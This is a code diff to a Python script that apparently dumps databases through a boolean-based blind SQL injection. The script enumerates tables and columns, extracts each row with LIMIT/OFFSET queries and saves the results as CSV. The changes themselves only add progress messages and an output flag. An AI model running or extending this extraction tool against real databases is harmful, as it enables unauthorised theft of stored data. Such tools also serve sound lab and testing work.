@@ -15,9 +15,11 @@ ROW_SEPARATOR = "~"
 COLUMN_SEPARATOR = "|"
 
 
-def extract(args, query):
+def extract(args, query, show_output=True):
     # get the output of a query from the boolean extractor
-    return run_query(query, args)
+    if show_output:
+        print(f"[*] Running query: {query}")
+    return run_query(query, args, show_result=show_output)
 
 
 def split_result(value, separator):
@@ -67,7 +69,7 @@ def dump_table(args, table, columns):
     rows = []
 
     count_query = f"SELECT COUNT(*) FROM {quoted_table}"
-    row_count = int(extract(args, count_query) or 0)
+    row_count = int(extract(args, count_query, show_output=False) or 0)
 
     for current_row in range(row_count):
         # use offset to retrieve the n-th row
@@ -75,7 +77,8 @@ def dump_table(args, table, columns):
             f"SELECT {row_expression} FROM {quoted_table} LIMIT 1 OFFSET {current_row}"
         )
         # extract row as string and convert it to a python list
-        extracted_row = extract(args, query)
+        print(f"[*] Dumping row {current_row + 1}/{row_count}")
+        extracted_row = run_query(query, args)
         rows.append(extracted_row.split(COLUMN_SEPARATOR))
 
     return rows
@@ -165,6 +168,8 @@ def main():
         return 2
     print("[*] Enumerating tables...")
     tables = enumerate_tables(args)
+    print(f"[+] Found tables: {', '.join(tables)}")
+
     output_dir = Path.cwd() / "dump"
     output_dir.mkdir(exist_ok=True)
 
@@ -174,12 +179,13 @@ def main():
         return 0
 
     for table in tables:
-        print(f"\n[*] Table: {table}")
+        print(f"\n\n[*] Enumerating {table}'s columns...")
         columns = enumerate_columns(args, table)
-        print(f"[+] Columns: {', '.join(columns)}")
+        print(f"[+] {table}'s columns: {', '.join(columns)}\n")
         if not columns:
             continue
 
+        print(f"[*] Dumping table {table}...")
         rows = dump_table(args, table, columns)
         output_path = write_table_csv(table, columns, rows, output_dir)
         print(f"[+] Rows extracted: {len(rows)}")
